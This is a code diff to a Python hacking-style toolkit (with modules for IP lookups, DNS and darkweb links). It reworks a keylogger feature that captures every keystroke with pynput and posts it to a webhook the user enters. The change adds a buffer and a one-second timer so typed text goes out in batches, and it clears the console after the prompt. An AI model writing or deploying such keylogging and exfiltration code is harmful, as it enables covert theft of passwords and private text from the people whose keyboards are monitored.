@@ -13,6 +13,7 @@ from api import api_ip, api_number, api_dns
 from sites import sites
 from darkweb import links
 from pynput import keyboard
+import  threading
 
 # FIXME - Add Gestions Error i d'ont have time sry ;p
 
@@ -655,27 +656,45 @@ while True:
             ░                      ░        ░                                                  
                         {blue}
             Met ton webhook : """)
+            os.system("cls")
 
             webhook = webhook_choice
 
+            buffer = ""
+            timer = None
+
+            def send_buffer():
+                global buffer
+
+                if buffer:
+                    data = {
+                        "content": buffer
+                    }
+
+                    requests.post(webhook, json=data)
+                    buffer = ""
+
+            def reset_timer():
+                global timer
+                if timer:
+                    timer.cancel()
+
+                timer = threading.Timer(1.0, send_buffer)  
+                timer.start()
+
             def on_press(key):
+                global buffer
+
                 try:
                     char = key.char
-                    print(char)
-                    data = {
-                        "content": char
-                    }
-                    
-                    requests.post(webhook, json=data)
-                except:
-                    char = str(key)
-                    print(char)
-                    
-                    data = {
-                        "content": char
-                    }
-                    
-                    requests.post(webhook, json=data)
+                    buffer += char
+
+                except AttributeError:
+                    if key == keyboard.Key.space:
+                        buffer += " "
+                    elif key == keyboard.Key.enter:
+                        buffer += "\n"
+                reset_timer()
 
             listener = keyboard.Listener(on_press=on_press)
             listener.start()
